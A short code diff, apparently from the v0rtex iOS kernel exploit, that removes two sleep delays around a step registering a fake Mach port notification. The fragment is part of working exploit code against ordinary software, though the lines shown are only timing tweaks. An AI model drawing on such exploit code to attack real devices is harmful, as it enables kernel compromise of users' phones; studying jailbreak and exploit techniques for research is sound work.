@@ -1095,8 +1095,6 @@ kern_return_t v0rtex(offsets_t *off, v0rtex_cb_t callback, void *cb_data)
         goto out;
     }
 
-    usleep(100000); // XXX
-
     // Register realport on fakeport
     mach_port_t notify = MACH_PORT_NULL;
     ret = mach_port_request_notification(self, fakeport, MACH_NOTIFY_PORT_DESTROYED, 0, realport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify);
@@ -1105,8 +1103,6 @@ kern_return_t v0rtex(offsets_t *off, v0rtex_cb_t callback, void *cb_data)
     {
         goto out;
     }
-
-    usleep(100000); // XXX
 
 #if 0
     uint32_t response[4 + (DATA_SIZE / sizeof(uint32_t))] = { 0 };
